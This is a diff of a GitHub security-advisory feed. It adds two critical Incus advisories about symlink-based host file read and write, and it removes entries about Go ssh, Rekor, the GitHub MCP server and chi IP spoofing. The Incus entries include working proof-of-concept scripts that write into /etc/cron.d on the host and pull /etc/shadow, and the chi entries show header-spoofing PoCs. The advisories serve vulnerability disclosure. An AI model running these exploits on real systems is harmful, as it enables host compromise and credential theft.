+        <title type="html"><![CDATA[[github.com/lxc/incus/v7/cmd/incusd] Incus has an arbitrary file write on host via `exec-output` symlink in crafted image]]></title>
+        <id>https://github.com/advisories/GHSA-73hr-m85f-64v9</id>
+        <link href="https://github.com/advisories/GHSA-73hr-m85f-64v9"/>
+        <updated>2026-06-26T18:32:53.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The <code>record-output</code> parameter of the <code>/instances/$name/exec</code> endpoint stores the output of the command in the <code>exec-output</code> directory of the instance. If <code>exec-output</code> is a symlink, file named <code>exec_UUID.stdout</code> and <code>exec_UUID.stderr</code> can be written to an arbitrary location where the <code>.stdout</code> file will contain arbitrary content. This behavior can be abused for arbitrary command execution.</p>
+<h3 id="details">Details</h3>
+<p>When an image is unpacked, top-level symlinks are extracted as is; allowing for <code>exec-output</code> to be placed on disk. In <code>instance_exec.go</code>, <code>os.Mkdir</code> continues of <code>exec-output</code> exists and <code>os.OpenFile</code> follows the <code>exec-output</code> symlink.</p>
+<h3 id="poc">PoC</h3>
+<p>Below, we place the <code>exec_UUID.stdout</code> file in <code>/etc/cron.d</code> on
+the host for arbitrary command execution.</p>
+<pre><code>#!/bin/sh
+# usage: $0 existing-imagefp
+set -eu
+
+basefp="${1}"
+
+die() {
+        printf '%s' "${@}" &gt;&amp;2
+        exit 1
+}
+
+command -v curl &gt;/dev/null 2&gt;&amp;1 || die 'error: curl not found\n'
+command -v python3 &gt;/dev/null 2&gt;&amp;1 || die 'error: python3 not found\n'
+
+tmpdir=$(mktemp -d)
+cleanup() {
+        rm -rf "${tmpdir}"
+}
+trap cleanup EXIT INT QUIT TERM HUP
+
+
+# insert exec-output symlink
+
+incus image export "${basefp}" "${tmpdir}/img"
+
+mkdir "${tmpdir}/repack"
+cd "${tmpdir}/repack"
+
+xz -cd "${tmpdir}/img" | tar -f- -vx
+
+rm -rf exec-output
+ln -s /etc/cron.d exec-output
+
+tar -f- -c * | gzip -c9 &gt;"${tmpdir}/img"
+
+cd - &gt;/dev/null
+incus image import "${tmpdir}"/img* --alias afw-exec-output
+
+
+# Launch container, exec with record-output via REST API
+incus launch afw-exec-output afw-exec-output
+incus wait afw-exec-output ip
+
+OP=$(curl -s --unix-socket /var/lib/incus/unix.socket \
+  -X POST -H 'Content-Type: application/json' \
+  -d '{"command":["/bin/sh","-c","echo * * * * * root id'"'&gt;'"'/afw-exec-output"],"record-output":true}' \
+  "lxd/1.0/instances/afw-exec-output/exec" | python3 -c "import sys,json;print(json.load(sys.stdin)['operation'])")
+
+curl -s --unix-socket /var/lib/incus/unix.socket "$OP/wait?timeout=30" &gt;/dev/null
+
+#find /etc/cron.d/exec_* -exec cat {} \;
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Constrained file creation in an arbitrary directory on the host via
+via an unsanitized symlink; possibly leading to command execution.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/lxc/incus/security/advisories/GHSA-73hr-m85f-64v9">https://github.com/lxc/incus/security/advisories/GHSA-73hr-m85f-64v9</a></li>
+<li><a href="https://github.com/advisories/GHSA-73hr-m85f-64v9">https://github.com/advisories/GHSA-73hr-m85f-64v9</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-73hr-m85f-64v9</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-06-26T18:32:52.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/lxc/incus/v7/cmd/incusd] Incus has an arbitrary file read+write on host via rootfs/ symlink in malicious image]]></title>
+        <id>https://github.com/advisories/GHSA-2q3f-q5pq-g8wv</id>
+        <link href="https://github.com/advisories/GHSA-2q3f-q5pq-g8wv"/>
+        <updated>2026-06-26T18:31:23.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A specially crafted image can be used to read or create/write arbitrary files on the host; possibly leading to arbitrary command execution.</p>
+<h3 id="details">Details</h3>
+<p>Incus validates an image as soon as it sees a normal <code>metadata.yaml</code> and a <code>rootfs/</code> entry, but full extraction can later process a duplicate top-level <code>rootfs</code> symlink. Later, the stopped-container file API opens <code>d.RootfsPath()</code> and passes that file descriptor to <code>forkfile</code>, which chroots to it.</p>
+<pre><code>metadata.yaml
+rootfs/
+rootfs -&gt; /
+</code></pre>
+<p>In practice, this allows a malicious actor to access the host's filesystem with root privileges.</p>
+<h3 id="poc">PoC</h3>
+<p>Below, we map the container's rootfs to <code>/</code> on the host, but it can be mapped anywhere. We then retrieve the host's <code>/etc/shadow</code> file and create a file in <code>/</code>.</p>
+<pre><code>#!/bin/sh
+set -eu
+
+tmpdir=$(mktemp -d)
+cleanup() {
+    rm -rf "${tmpdir}"
+}
+trap cleanup EXIT INT QUIT TERM HUP
+
+mkdir -p "${tmpdir}/img/rootfs"
+cat&lt;&lt;__EOF__&gt;"${tmpdir}/img/metadata.yaml"
+architecture: x86_64
+creation_date: 1
+properties:
+  description: PoC rootfs symlink host afrw
+__EOF__
+
+cd "${tmpdir}/img"
+tar --owner=0 --group=0 -f- -c * &gt;../afrw-rootfs-symlink.tar
+
+# inject rootfs symlink
+rmdir rootfs
+ln -s / rootfs
+tar --owner=0 --group=0 -f ../afrw-rootfs-symlink.tar --append rootfs
+
+
+incus image import ../afrw-rootfs-symlink.tar --alias afrw-rootfs-symlink
+incus init afrw-rootfs-symlink afrw-rootfs-symlink
+
+
+# read
+incus file pull afrw-rootfs-symlink/etc/shadow "${tmpdir}/shadow"
+cat "${tmpdir}/shadow"
+
+# write
+printf 'afrw-rootfs-symlink\n' &gt;"${tmpdir}/afrw-rootfs-symlink"
+incus file push "${tmpdir}/afrw-rootfs-symlink" afrw-rootfs-symlink/
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Arbitrary file read and write on the host via unsanitized symlink; possibly leading to command execution.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/lxc/incus/security/advisories/GHSA-2q3f-q5pq-g8wv">https://github.com/lxc/incus/security/advisories/GHSA-2q3f-q5pq-g8wv</a></li>
+<li><a href="https://github.com/advisories/GHSA-2q3f-q5pq-g8wv">https://github.com/advisories/GHSA-2q3f-q5pq-g8wv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-2q3f-q5pq-g8wv</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-06-26T18:31:21.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[golang.org/x/crypto/ssh] golang.org/x/crypto/ssh: Invoking VerifiedPublicKeyCallback permissions skip enforcement]]></title>
         <id>https://github.com/advisories/GHSA-x527-x647-q7gg</id>
@@ -229,746 +1628,5 @@
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-06-25T22:14:38.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[golang.org/x/crypto/ssh] golang.org/x/crypto/ssh: Invoking byte arithmetic causes underflow and panic]]></title>
-        <id>https://github.com/advisories/GHSA-q4h4-gmj2-qvw2</id>
-        <link href="https://github.com/advisories/GHSA-q4h4-gmj2-qvw2"/>
-        <updated>2026-06-25T22:14:23.000Z</updated>
-        <content type="html"><![CDATA[<p>An incorrectly placed cast from bytes to int allowed for server-side panic in the AES-GCM packet decoder for well-crafted inputs.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-46597">https://nvd.nist.gov/vuln/detail/CVE-2026-46597</a></li>
-<li><a href="https://go.dev/cl/781620">https://go.dev/cl/781620</a></li>
-<li><a href="https://go.dev/issue/79561">https://go.dev/issue/79561</a></li>
-<li><a href="https://groups.google.com/g/golang-announce/c/a082jnz-LvI">https://groups.google.com/g/golang-announce/c/a082jnz-LvI</a></li>
-<li><a href="https://pkg.go.dev/vuln/GO-2026-5013">https://pkg.go.dev/vuln/GO-2026-5013</a></li>
-<li><a href="https://github.com/advisories/GHSA-q4h4-gmj2-qvw2">https://github.com/advisories/GHSA-q4h4-gmj2-qvw2</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-q4h4-gmj2-qvw2</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-25T22:14:22.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[golang.org/x/crypto/ssh/agent] golang.org/x/crypto/ssh/agent doesn't drop invoking agent constraints when forwarding keys]]></title>
-        <id>https://github.com/advisories/GHSA-f5wc-c3c7-36mc</id>
-        <link href="https://github.com/advisories/GHSA-f5wc-c3c7-36mc"/>
-        <updated>2026-06-25T22:14:01.000Z</updated>
-        <content type="html"><![CDATA[<p>When adding a key to a remote agent constraint extensions such as <a href="mailto:restrict-destination-v00@openssh.com">restrict-destination-v00@openssh.com</a> were not serialized in the request. Destination restrictions were silently stripped when forwarding keys, allowing unrestricted use of the key on the remote host. The client now serializes all constraint extensions. Additionally, the in-memory keyring returned by NewKeyring() now rejects keys with unsupported constraint extensions instead of silently ignoring them.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39832">https://nvd.nist.gov/vuln/detail/CVE-2026-39832</a></li>
-<li><a href="https://go.dev/cl/778642">https://go.dev/cl/778642</a></li>
-<li><a href="https://go.dev/issue/79435">https://go.dev/issue/79435</a></li>
-<li><a href="https://groups.google.com/g/golang-announce/c/a082jnz-LvI">https://groups.google.com/g/golang-announce/c/a082jnz-LvI</a></li>
-<li><a href="https://pkg.go.dev/vuln/GO-2026-5006">https://pkg.go.dev/vuln/GO-2026-5006</a></li>
-<li><a href="https://github.com/advisories/GHSA-f5wc-c3c7-36mc">https://github.com/advisories/GHSA-f5wc-c3c7-36mc</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-f5wc-c3c7-36mc</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-06-25T22:14:00.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[golang.org/x/crypto/ssh/agent] golang.org/x/crypto/ssh/agent doesn't enforce invoking key constraints]]></title>
-        <id>https://github.com/advisories/GHSA-jppx-rxg9-jmrx</id>
-        <link href="https://github.com/advisories/GHSA-jppx-rxg9-jmrx"/>
-        <updated>2026-06-25T22:13:31.000Z</updated>
-        <content type="html"><![CDATA[<p>The in-memory keyring returned by NewKeyring() silently accepted keys with the ConfirmBeforeUse constraint but never enforced it. The key would sign without any confirmation prompt, with no indication to the caller that the constraint was not in effect. NewKeyring() now returns an error when unsupported constraints are requested.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39833">https://nvd.nist.gov/vuln/detail/CVE-2026-39833</a></li>
-<li><a href="https://go.dev/cl/778640">https://go.dev/cl/778640</a></li>
-<li><a href="https://go.dev/cl/778641">https://go.dev/cl/778641</a></li>
-<li><a href="https://go.dev/issue/79436">https://go.dev/issue/79436</a></li>
-<li><a href="https://groups.google.com/g/golang-announce/c/a082jnz-LvI">https://groups.google.com/g/golang-announce/c/a082jnz-LvI</a></li>
-<li><a href="https://pkg.go.dev/vuln/GO-2026-5005">https://pkg.go.dev/vuln/GO-2026-5005</a></li>
-<li><a href="https://github.com/advisories/GHSA-jppx-rxg9-jmrx">https://github.com/advisories/GHSA-jppx-rxg9-jmrx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jppx-rxg9-jmrx</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-06-25T22:13:31.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[golang.org/x/crypto/ssh/agent] golang.org/x/crypto/ssh/agent: Invoking pathological inputs can lead to client panic]]></title>
-        <id>https://github.com/advisories/GHSA-9m57-25v3-79x9</id>
-        <link href="https://github.com/advisories/GHSA-9m57-25v3-79x9"/>
-        <updated>2026-06-25T22:12:53.000Z</updated>
-        <content type="html"><![CDATA[<p>For certain crafted inputs, a 'ed25519.PrivateKey' was created by casting malformed wire bytes, leading to a panic when used.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-46598">https://nvd.nist.gov/vuln/detail/CVE-2026-46598</a></li>
-<li><a href="https://go.dev/cl/781360">https://go.dev/cl/781360</a></li>
-<li><a href="https://go.dev/issue/79596">https://go.dev/issue/79596</a></li>
-<li><a href="https://groups.google.com/g/golang-announce/c/a082jnz-LvI">https://groups.google.com/g/golang-announce/c/a082jnz-LvI</a></li>
-<li><a href="https://pkg.go.dev/vuln/GO-2026-5033">https://pkg.go.dev/vuln/GO-2026-5033</a></li>
-<li><a href="https://github.com/advisories/GHSA-9m57-25v3-79x9">https://github.com/advisories/GHSA-9m57-25v3-79x9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-9m57-25v3-79x9</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-25T22:12:52.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/sigstore/rekor] Rekor has an OOM Condition due to Unbounded gzip Decompression in Alpine APK Parsing Logic]]></title>
-        <id>https://github.com/advisories/GHSA-47q9-m4ww-924m</id>
-        <link href="https://github.com/advisories/GHSA-47q9-m4ww-924m"/>
-        <updated>2026-06-25T21:33:39.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="description">Description</h2>
-<p>The <code>Package.Unmarshal()</code> function in <code>pkg/types/alpine/apk.go</code> decompresses the signature and control gzip members of an APK file into in-memory buffers without bounding the total decompressed size. The existing <code>max_apk_metadata_size</code> check (default 1MB) is only applied to individual tar entry header sizes after decompression completes, so it does not prevent a decompression bomb from consuming unbounded heap memory.</p>
-<p>An attacker can craft a gzip stream that compresses at a ~1000:1 ratio (e.g., 2MB compressed zeros → 2GB decompressed). When submitted as spec.package.content in an Alpine <code>ProposedEntry</code>, the server decompresses the full payload into memory during request processing, triggering a fatal Go runtime out-of-memory error or OS OOM-kill that cannot be caught by the server's recover() middleware.</p>
-<p>This is reachable via two unauthenticated endpoints:</p>
-<ul>
-<li>POST /api/v1/log/entries (createLogEntry)</li>
-<li>POST /api/v1/log/entries/retrieve (searchLogQuery)</li>
-</ul>
-<p>Both invoke <code>V001Entry.Canonicalize()</code> → <code>fetchExternalEntities()</code> → <code>apk.Unmarshal(packageData)</code>, which performs the unbounded decompression.</p>
-<h2 id="workarounds">Workarounds</h2>
-<p>There is no effective workaround. Setting <code>max_request_body_size</code> reduces but does not eliminate exposure due to the ~1000:1 compression ratio (a 1MB body limit still allows ~1GB heap allocation). Setting <code>max_apk_metadata_size</code> has no effect on this vulnerability since the check is applied after decompression.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/sigstore/rekor/security/advisories/GHSA-47q9-m4ww-924m">https://github.com/sigstore/rekor/security/advisories/GHSA-47q9-m4ww-924m</a></li>
-<li><a href="https://github.com/advisories/GHSA-47q9-m4ww-924m">https://github.com/advisories/GHSA-47q9-m4ww-924m</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-47q9-m4ww-924m</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-25T21:33:36.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/github/github-mcp-server] GitHub MCP Server: Lockdown mode singleton in HTTP server causes cross-user GraphQL client confusion]]></title>
-        <id>https://github.com/advisories/GHSA-pjp5-fpmr-3349</id>
-        <link href="https://github.com/advisories/GHSA-pjp5-fpmr-3349"/>
-        <updated>2026-06-25T21:32:10.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>When running in HTTP mode with --lockdown-mode enabled, the RepoAccessCache is implemented as a process-global singleton initialized with the first authenticated user's GraphQL client. All subsequent requests from different users share this singleton and their lockdown-related GraphQL queries are executed using the first user's credentials. The singleton is never updated to reflect later users' tokens.</p>
-<h3 id="details">Details</h3>
-<p>The singleton is defined in pkg/lockdown/lockdown.go:</p>
-<pre><code class="language-go">var (
-    instance   *RepoAccessCache
-    instanceMu sync.Mutex
-)
-
-func GetInstance(client *githubv4.Client, opts ...RepoAccessOption) *RepoAccessCache {
-    instanceMu.Lock()
-    defer instanceMu.Unlock()
-    if instance == nil {
-        instance = &amp;RepoAccessCache{
-            client: client,  // only stored on first call
-        }
-    }
-    return instance  // subsequent callers receive the same object regardless of their client
-}
-</code></pre>
-<p>In HTTP mode, pkg/github/dependencies.go calls this per request:</p>
-<pre><code class="language-go">func (d *RequestDeps) GetRepoAccessCache(ctx context.Context) (*lockdown.RepoAccessCache, error) {
-    gqlClient, err := d.GetGQLClient(ctx)  // creates client with request's token
-    ...
-    instance := lockdown.GetInstance(gqlClient, d.RepoAccessOpts...)
-    // gqlClient is silently dropped if singleton already exists
-    return instance, nil
-}
-</code></pre>
-<p>The singleton's internal client field is never updated after the first initialization. All lockdown GraphQL queries that check repository access and visibility (queryRepoAccessInfo, called by IsSafeContent) run under the first authenticated user's token for the lifetime of the process.</p>
-<p>IsSafeContent is called in at least six places across pkg/github/issues.go and pkg/github/pullrequests.go to decide whether to trust or sanitize content from external contributors.</p>
-<h3 id="poc">PoC</h3>
-<p>The following program demonstrates that two distinct GraphQL clients produce the same singleton pointer, confirming that the second client is discarded:</p>
-<pre><code class="language-go">package main
-
-import (
-    "fmt"
-    "net/http"
-    "github.com/github/github-mcp-server/pkg/lockdown"
-    "github.com/shurcooL/githubv4"
-)
-
-func main() {
-    httpClientA := &amp;http.Client{}
-    httpClientB := &amp;http.Client{}
-    gqlClientA := githubv4.NewEnterpriseClient("https://api.github.com/graphql", httpClientA)
-    gqlClientB := githubv4.NewEnterpriseClient("https://api.github.com/graphql", httpClientB)
-
-    fmt.Printf("gqlClientA (user A token): %p\n", gqlClientA)
-    fmt.Printf("gqlClientB (user B token): %p\n", gqlClientB)
-    fmt.Printf("clients are different objects: %v\n\n", gqlClientA != gqlClientB)
-
-    instanceForA := lockdown.GetInstance(gqlClientA)
-    instanceForB := lockdown.GetInstance(gqlClientB)
-
-    fmt.Printf("lockdown instance returned for user A: %p\n", instanceForA)
-    fmt.Printf("lockdown instance returned for user B: %p\n", instanceForB)
-    fmt.Printf("same singleton returned for both users: %v\n", instanceForA == instanceForB)
-}
-</code></pre>
-<p>Output:</p>
-<pre><code>gqlClientA (user A token): 0x400044070
-gqlClientB (user B token): 0x400044078
-clients are different objects: true
-
-lockdown instance returned for user A: 0x400002ecc0
-lockdown instance returned for user B: 0x400002ecc0
-same singleton returned for both users: true
-</code></pre>
-<img width="1642" height="450" alt="image" src="https://github.com/user-attachments/assets/bec46420-9ba7-458e-8710-62f951cb836a">
-
-
-<h3 id="impact">Impact</h3>
-<p>This affects deployments running the HTTP server with --lockdown-mode, which is the intended configuration for multi-user scenarios such as GitHub Copilot's managed MCP endpoint.</p>
-<p>Three concrete consequences:</p>
-<p>First, the ViewerLogin field in cache entries always reflects the first authenticated user's identity. The IsSafeContent check <code>repoInfo.ViewerLogin == strings.ToLower(username)</code> compares this stale value against each subsequent user's login, producing incorrect results for all users except the first.</p>
-<p>Second, repository visibility and collaborator access data stored in the cache is evaluated through the first user's token. If user A cannot see a private repository but user B can (or vice versa), the cached isPrivate and hasPushAccess values will reflect user A's view of that repository, causing IsSafeContent to return wrong decisions for user B. In lockdown mode, a wrong true result means potentially injected content from untrusted external contributors is passed to the model without sanitization.</p>
-<p>Third, if the first user's token is revoked or expires, all subsequent lockdown GraphQL queries fail with authentication errors. Since getRepoAccessInfo propagates these errors, IsSafeContent returns an error for every request, breaking lockdown protection for all users until the process is restarted.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/github/github-mcp-server/security/advisories/GHSA-pjp5-fpmr-3349">https://github.com/github/github-mcp-server/security/advisories/GHSA-pjp5-fpmr-3349</a></li>
-<li><a href="https://github.com/advisories/GHSA-pjp5-fpmr-3349">https://github.com/advisories/GHSA-pjp5-fpmr-3349</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-pjp5-fpmr-3349</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-25T21:32:09.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/go-chi/chi/v5/middleware] chi Has an IP Spoofing Vulnerability in `middleware.RealIP`]]></title>
-        <id>https://github.com/advisories/GHSA-3fxj-6jh8-hvhx</id>
-        <link href="https://github.com/advisories/GHSA-3fxj-6jh8-hvhx"/>
-        <updated>2026-06-25T18:21:38.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The <code>RealIP</code> middleware in <code>go-chi/chi</code> is vulnerable to IP spoofing because it blindly trusts the first (leftmost) element of the <code>X-Forwarded-For</code> HTTP header. This allows a remote attacker to bypass IP-based access control lists (ACLs) and rate-limiting mechanisms by providing a spoofed IP address in the header.</p>
-<h2 id="details">Details</h2>
-<p>In <code>middleware/realip.go</code>, the <code>realIP</code> function parses the <code>X-Forwarded-For</code> header and extracts the first comma-separated value:</p>
-<pre><code class="language-go">func realIP(r *http.Request) string {
-    // ...
-    } else if xff := r.Header.Get(xForwardedFor); xff != "" {
-        ip, _, _ = strings.Cut(xff, ",")
-    }
-    // ...
-}
-</code></pre>
-<p>Standard practice for <code>X-Forwarded-For</code> is that each proxy appends the client's IP to the end of the list. However, since the client can also provide this header, the leftmost values are untrusted. A client can send a header like <code>X-Forwarded-For: &lt;spoofed_ip&gt;, &lt;actual_proxy_ip&gt;</code>, and <code>go-chi/chi</code> will treat <code>&lt;spoofed_ip&gt;</code> as the source of the request.</p>
-<h2 id="proof-of-concept-poc">Proof of Concept (PoC)</h2>
-<p>The following code demonstrates how an attacker can bypass an IP-based restriction.</p>
-<pre><code class="language-go">package main
-
-import (
-        "fmt"
-        "net/http"
-        "net/http/httptest"
-
-        "github.com/go-chi/chi/v5"
-        "github.com/go-chi/chi/v5/middleware"
-)
-
-func main() {
-        r := chi.NewRouter()
-
-        // Enable the vulnerable RealIP middleware
-        r.Use(middleware.RealIP)
-
-        // An endpoint that should be restricted to a specific administrator IP (1.2.3.4)
-        r.Get("/admin/secret", func(w http.ResponseWriter, r *http.Request) {
-                clientIP := r.RemoteAddr
-                fmt.Printf("[Server] Request received from IP: %s\n", clientIP)
-
-                // Simulate IP-based access control
-                if clientIP == "1.2.3.4" {
-                        w.WriteHeader(http.StatusOK)
-                        w.Write([]byte("CONFIDENTIAL: The secret code is 42\n"))
-                } else {
-                        w.WriteHeader(http.StatusForbidden)
-                        w.Write([]byte("Access Denied: You are not an administrator.\n"))
-                }
-        })
-
-        // --- Attack Simulation ---
-        fmt.Println("--- PoC: IP Spoofing Attack on chi/middleware.RealIP ---")
-
-        // 1. Normal Request (Should be denied)
-        req1, _ := http.NewRequest("GET", "/admin/secret", nil)
-        rr1 := httptest.NewRecorder()
-        r.ServeHTTP(rr1, req1)
-        fmt.Printf("[Client] Normal Request -&gt; Status: %d, Body: %s", rr1.Code, rr1.Body.String())
-
-        // 2. Spoofed Request (Using X-Forwarded-For)
-        // Attacker claims to be '1.2.3.4'
-        req2, _ := http.NewRequest("GET", "/admin/secret", nil)
-        req2.Header.Set("X-Forwarded-For", "1.2.3.4, 5.6.7.8") // 5.6.7.8 is a fake proxy IP
-        rr2 := httptest.NewRecorder()
-        r.ServeHTTP(rr2, req2)
-        fmt.Printf("[Client] Spoofed Request -&gt; Status: %d, Body: %s", rr2.Code, rr2.Body.String())
-}
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>An attacker can masquerade as any IP address. This can lead to:</p>
-<ul>
-<li><strong>Bypass of Authentication/Authorization:</strong> Accessing administrative panels or private APIs restricted by IP.</li>
-<li><strong>Rate Limiting Evasion:</strong> Circumbeting rate limiters that use <code>RemoteAddr</code> as a key.</li>
-<li><strong>Log Forgery:</strong> Causing incorrect IP addresses to be recorded in security logs.</li>
-</ul>
-<h2 id="cwe">CWE</h2>
-<ul>
-<li><strong>CWE-290:</strong> Authentication Bypass by Spoofing</li>
-<li><strong>CWE-345:</strong> Insufficient Verification of Data Authenticity</li>
-</ul>
-<h2 id="cvss-score">CVSS Score</h2>
-<ul>
-<li><strong>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N</strong> (6.9 Moderate)</li>
-</ul>
-<h2 id="affected-versions">Affected Versions</h2>
-<ul>
-<li><code>github.com/go-chi/chi/v5</code> &lt;= <code>v5.2.1</code> (and all previous versions)</li>
-</ul>
-<h2 id="recommendation">Recommendation</h2>
-<ol>
-<li><strong>Stop using <code>middleware.RealIP</code></strong> if you cannot guarantee that the incoming request headers are from a trusted source and have been sanitized by a proxy.</li>
-<li>Implement a trust-based IP extraction mechanism that verifies the chain of proxies.</li>
-<li>Use the <code>X-Forwarded-For</code> header by traversing it from <strong>right to left</strong> and stopping at the first IP address that is not in your list of trusted proxies.</li>
-</ol>
-<h2 id="suggested-fix">Suggested Fix</h2>
-<p>A secure implementation of <code>RealIP</code> should allow developers to specify a list of trusted proxy IP ranges (CIDRs). Below is a conceptual example of how to fix this by traversing the <code>X-Forwarded-For</code> header from right to left:</p>
-<pre><code class="language-go">func GetClientIP(r *http.Request, trustedProxies []net.IPNet) string {
-        xff := r.Header.Get("X-Forwarded-For")
-        if xff == "" {
-                return r.RemoteAddr
-        }
-
-        ips := strings.Split(xff, ",")
-        // Traverse from right to left
-        for i := len(ips) - 1; i &gt;= 0; i-- {
-                ipStr := strings.TrimSpace(ips[i])
-                ip := net.ParseIP(ipStr)
-                if ip == nil {
-                        continue
-                }
-
-                if !isTrustedProxy(ip, trustedProxies) {
-                        return ipStr
-                }
-        }
-
-        return r.RemoteAddr
-}
-
-func isTrustedProxy(ip net.IP, trustedProxies []net.IPNet) bool {
-        for _, network := range trustedProxies {
-                if network.Contains(ip) {
-                        return true
-                }
-        }
-        return false
-}
-</code></pre>
-<p>By providing a configuration like <code>middleware.RealIPWithConfig(Config{TrustedProxies: []string{"10.0.0.0/8"}})</code> , the middleware can safely identify the true client IP even in complex proxy environments.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/go-chi/chi/security/advisories/GHSA-3fxj-6jh8-hvhx">https://github.com/go-chi/chi/security/advisories/GHSA-3fxj-6jh8-hvhx</a></li>
-<li><a href="https://github.com/advisories/GHSA-3fxj-6jh8-hvhx">https://github.com/advisories/GHSA-3fxj-6jh8-hvhx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-3fxj-6jh8-hvhx</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-25T18:21:37.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/go-chi/chi/v5/middleware] chi's RealIP Middleware allows IP spoofing via unvalidated X-Forwarded-For header]]></title>
-        <id>https://github.com/advisories/GHSA-rjr7-jggh-pgcp</id>
-        <link href="https://github.com/advisories/GHSA-rjr7-jggh-pgcp"/>
-        <updated>2026-06-25T18:19:17.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>realip middleware in go-chi/chi trusts headers like x-forwarded-for without checking them, so attackers can fake their ip and bypass rate limits or access controls</p>
-<h3 id="details">Details</h3>
-<p>the vuln is in middleware/realip.go , the realIP() function pulls IPs straight from client headers and replaces r.RemoteAddr without checking if the request came from a trusted proxy</p>
-<pre><code class="language-go">func realIP(r *http.Request) string {
-    var ip string
-    if tcip := r.Header.Get(trueClientIP); tcip != "" {
-        ip = tcip  // controlled by attacker
-    } else if xrip := r.Header.Get(xRealIP); xrip != "" {
-        ip = xrip  // controlled by attacker
-    } else if xff := r.Header.Get(xForwardedFor); xff != "" {
-        ip, _, _ = strings.Cut(xff, ",")  // controlled by attacker
-    }
-    // ...
-    return ip
-}
-</code></pre>
-<p>no trusted proxy cidr check in place, any client can send these headers</p>
-<h3 id="poc">PoC</h3>
-<p>create a server with chi and use realip middleware</p>
-<pre><code class="language-go">package main
-
-import (
-    "fmt"
-    "net/http"
-    "github.com/go-chi/chi/v5"
-    "github.com/go-chi/chi/v5/middleware"
-)
-
-func main() {
-    r := chi.NewRouter()
-    r.Use(middleware.RealIP)
-
-    r.Get("/admin", func(w http.ResponseWriter, r *http.Request) {
-        // ip-based access control got bypassed
-        if r.RemoteAddr == "127.0.0.1" {
-            w.Write([]byte("SECRET ADMIN DATA"))
-            return
-        }
-        http.Error(w, "Forbidden", 403)
-    })
-
-    http.ListenAndServe(":8080", r)
-}
-</code></pre>
-<p>spoofed the ip to bypass access control</p>
-<pre><code class="language-bash">curl -H "X-Forwarded-For: 127.0.0.1" http://localhost:8080/admin
-</code></pre>
-<h3 id="impact">Impact</h3>
-<ul>
-<li>ip-based access control bypass lets attackers reach restricted endpoints</li>
-<li>rate limiting bypass lets attackers avoid limits by rotating spoofed ips</li>
